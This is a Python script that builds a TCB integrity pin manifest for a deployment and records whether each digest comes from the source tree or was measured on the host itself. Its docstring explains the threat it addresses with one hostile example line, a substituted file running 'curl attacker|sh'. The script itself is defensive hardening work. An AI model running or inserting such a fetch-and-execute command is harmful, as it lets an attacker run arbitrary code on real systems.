#!/usr/bin/env python3
"""Build the root-owned §2.5 TCB pin manifest for the live kit (audit **F-10**).

`brops_core::tcb_integrity::verify_tcb_integrity` decides the whole §2.5 floor — owner, writability,
start-time content pin, ancestor safety, and a coverage floor that refuses an under-specified
manifest. It was fully implemented and, until the broker's `tcb_probe` landed, fully unwired. The
probe closed one half; this closes the other: the live kit had no `TcbPinManifest` to present, so the
floor could only ever refuse for absence, which is fail-closed but proves nothing.

This emits a manifest covering the complete `TCB_REQUIRED_ARTIFACTS` set for THIS deployment. Every
entry points at a file that genuinely serves that role here, and where one file serves several roles
it is pinned under each of them rather than a stand-in being invented:

  * the three Python service front doors ARE the supervisor / signer / challenge-authority
    executables in this kit — they are what runs, so they are what gets measured;
  * the launcher's and the executor's configuration IS the §4.3 lease (uids, the image pin, and now
    the three request digests), so both `.config` roles point at it;
  * the remaining `.config` roles and the broker's pinned-manifest configuration are the one shared
    `config.json` each of those components actually loads;
  * this kit is orchestrated by `run_live_turn.sh`, not by systemd, so a root-owned copy of that
    script is what the two `.unit` roles pin. Writing plausible-looking unit files for units that do
    not exist would make the manifest describe a deployment that isn't this one.

Run AFTER everything exists (the lease and the sudoers allowlist are written late), and BEFORE the
services start — the pin is a start-time measurement, so anything provisioned after it is not
covered by it.

WHERE THE DIGESTS COME FROM, AND WHAT THAT DOES NOT PROVE
---------------------------------------------------------
A content pin is only as good as the ORIGIN of the number it pins. This script used to compute every
`expected_sha256` by hashing the very file it was pinning, in the same root shell that had just
installed that file, seconds earlier. The manifest is the sole input to the later §2.5 check, so the
check could only ever compare the tree against itself: substituting an artifact BEFORE the pin was
taken produced a manifest that pinned the substituted bytes and a floor that verified happily. Driven
against this builder, a `run_supervisor.py` replaced with ``os.system('curl attacker|sh')`` was pinned
at its own digest and the manifest carried no field that even named where the number came from.

So the digests are now split, and the split is RECORDED in the manifest (`digest_origin` per artifact,
`digest_origin_counts` at the top level):

  * **``source:<relative path>``** — the artifact was copied verbatim out of the repository tree the
    kit was staged from, so its digest is taken from THE SOURCE, which is not the deployment tree.
    The installed copy is then compared against it and a difference REFUSES the build: that is the
    install step being caught substituting bytes, which is what a content pin is for. `--source-dir`
    is required precisely so this cannot silently degrade to self-measurement.
  * **``deployment-measured``** — the artifact does not exist anywhere but this host: the compiled
    binaries (built here), the provisioned lease/root-anchor/recorder-policy/config, the generated
    sudoers allowlist. Their digests are self-measured and CANNOT detect a provisioner that was
    already compromised when it wrote them. They still detect any change between the pin and the
    check, which is a real property, but it is not integrity of origin, and the manifest now says so
    rather than presenting both halves as the same kind of fact.

Closing the second half needs an origin outside this host entirely (release-signed binary digests, or
an operator signature over the manifest). That is an Owner/Architect decision, not something this
script can invent; what it can do is refuse to pretend, which is why a manifest with NO independent
digest at all is refused outright.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import sys

#: logical_name -> path, RELATIVE TO THE SOURCE TREE, for each pinned artifact that the kit copies
#: verbatim out of the repository. These are the only entries whose digest has an origin other than
#: the deployment tree being measured. Everything absent from this map is compiled or provisioned on
#: the deployment host and is `deployment-measured` — see the module docstring.
SOURCE_ORIGIN = {
    "supervisor.bin": "engine/ci/live/run_supervisor.py",
    "isolated-signer.bin": "engine/ci/live/run_signer.py",
    "desktop-challenge-authority.bin": "engine/ci/live/run_authority.py",
    # Both `.unit` roles pin a root-owned copy of the orchestrator script, which is a repo file.
    "trusted-verifier-broker.unit": "engine/ci/live/run_live_turn.sh",
    "desktop-challenge-authority.unit": "engine/ci/live/run_live_turn.sh",
}

DEPLOYMENT_MEASURED = "deployment-measured"


def sha256_file(path: str) -> str:
    digest = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def main() -> int:
    ap = argparse.ArgumentParser(description="Emit the live kit's §2.5 TCB pin manifest")
    ap.add_argument("--root-dir", required=True, help="e.g. /opt/brops-live")
    ap.add_argument("--sudoers", required=True, help="the governed-execution allowlist source")
    ap.add_argument("--unit", required=True, help="root-owned copy of the orchestrator script")
    ap.add_argument("--out", required=True, help="where to write the manifest JSON")
    ap.add_argument(
        "--source-dir", required=True,
        help="the repository tree the kit was staged FROM. Required, not optional: it is the only "
             "origin for a pinned digest that is not the deployment tree the pin is checked against")
    args = ap.parse_args()

    root = os.path.abspath(args.root_dir)
    tcb = os.path.join(root, "tcb")
    live = os.path.join(root, "engine", "ci", "live")
    binaries = os.path.join(root, "bin")
    config = os.path.join(root, "config.json")
    lease = os.path.join(tcb, "executor.lease")

    # logical_name -> (path, owner). Every name in TCB_REQUIRED_ARTIFACTS must appear, or the
    # verifier's coverage floor refuses the manifest — which is the behaviour we want if this map
    # ever falls behind the required set.
    mapping = {
        # ---- the seven trusted executables ----
        "supervisor.bin": os.path.join(live, "run_supervisor.py"),
        "evidence-recorder-runner.bin": os.path.join(binaries, "governed_recorder"),
        "privileged-launcher.bin": os.path.join(tcb, "privileged-launcher.bin"),
        "contained-executor.bin": os.path.join(tcb, "contained-executor.bin"),
        "isolated-signer.bin": os.path.join(live, "run_signer.py"),
        "trusted-verifier-broker.bin": os.path.join(binaries, "live_turn"),
        "desktop-challenge-authority.bin": os.path.join(live, "run_authority.py"),
        # ---- each executable's configuration ----
        "supervisor.config": config,
        # The recorder's configuration is NOT the shared config.json — it never reads that file. It
        # reads exactly one root-owned document, at a path compiled into the binary, and takes the
        # launcher/executor/lease/store/state paths and the two image digests from it. Pinning
        # config.json here would have measured a file the recorder does not consult while leaving the
        # file that actually steers it unmeasured.
        "evidence-recorder-runner.config": os.path.join(tcb, "recorder-policy.json"),
        # The launcher takes its invoker/drop-target uids, its image pin and (F-08) the three
        # request digests from the lease. That file IS its configuration.
        "privileged-launcher.config": lease,
        "contained-executor.config": lease,
        "isolated-signer.config": config,
        "trusted-verifier-broker.config": config,
        "desktop-challenge-authority.config": config,
        # ---- IPC / peer-auth policies ----
        "desktop-challenge-authority.ipc-policy":
            os.path.join(tcb, "desktop-challenge-authority.ipc-policy.json"),
        "trusted-verifier-broker.ipc-policy":
            os.path.join(tcb, "trusted-verifier-broker.ipc-policy.json"),
        # ---- broker pinned-manifest configuration ----
        "trusted-verifier-broker.pinned-manifest-config": config,
        # ---- launch steering + trust roots ----
        "governed-execution-allowlist.source": os.path.abspath(args.sudoers),
        "key-manifest.root-anchor": os.path.join(tcb, "root-anchor.json"),
        # ---- the two service "units" ----
        "trusted-verifier-broker.unit": os.path.abspath(args.unit),
        "desktop-challenge-authority.unit": os.path.abspath(args.unit),
    }

    source = os.path.abspath(args.source_dir)
    if not os.path.isdir(source):
        print("FAIL: --source-dir %s is not a directory" % source, file=sys.stderr)
        return 1

    artifacts = []
    independent = 0
    for logical_name, path in sorted(mapping.items()):
        if not os.path.isfile(path):
            print("FAIL: %s is missing for %s" % (path, logical_name), file=sys.stderr)
            return 1
        installed = sha256_file(path)

        relative = SOURCE_ORIGIN.get(logical_name)
        if relative is None:
            # Compiled or provisioned on this host: there is nowhere else the bytes exist, so the
            # digest is self-measured and the manifest says so instead of implying otherwise.
            origin, expected = DEPLOYMENT_MEASURED, installed
        else:
            origin_path = os.path.join(source, *relative.split("/"))
            if not os.path.isfile(origin_path):
                print("FAIL: %s claims a source origin at %s, which is not there. A pin whose "
                      "origin is missing must not silently fall back to hashing the deployment "
                      "copy — that is the self-referential pin this argument exists to close."
                      % (logical_name, origin_path), file=sys.stderr)
                return 1
            expected = sha256_file(origin_path)
            if expected != installed:
                print("FAIL: %s at %s is sha256 %s, but the source it was staged from (%s) is %s. "
                      "The install step changed the bytes; refusing to pin what was installed "
                      "rather than what was authorized." % (logical_name, path, installed,
                                                            origin_path, expected),
                      file=sys.stderr)
                return 1
            origin = "source:" + relative
            independent += 1

        artifacts.append({
            "logical_name": logical_name,
            "path": path,
            "expected_sha256": expected,
            # This kit has no separate brops-admin principal: root owns every TCB artifact, and the
            # manifest says so rather than naming an owner that does not exist here.
            "expected_owner": "root",
            # Not consumed by `verify_tcb_integrity` (serde ignores it). It is here so an auditor
            # reading the manifest can tell which pins have an origin outside the tree they police
            # and which are the tree measuring itself.
            "digest_origin": origin,
        })

    if independent == 0:
        print("FAIL: not one pinned digest has an origin outside the tree it measures. A manifest "
              "built entirely by hashing the files it pins cannot fail a content check, and "
              "presenting it as a §2.5 content pin is the defect, not the floor.", file=sys.stderr)
        return 1

    manifest = {
        "artifacts": artifacts,
        "owner_uids": {"root": 0, "brops_admin": 0},
        "digest_origin_counts": {
            "source": independent,
            DEPLOYMENT_MEASURED: len(artifacts) - independent,
        },
    }
    with open(args.out, "w", encoding="utf-8") as f:
        json.dump(manifest, f, separators=(",", ":"))
    os.chmod(args.out, 0o644)
    print("tcb pin manifest: %d artifacts -> %s" % (len(artifacts), args.out))
    print("  digest origin: %d from the source tree %s, %d self-measured on this host "
          "(compiled or provisioned here — these cannot detect a compromised provisioner)"
          % (independent, source, len(artifacts) - independent))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
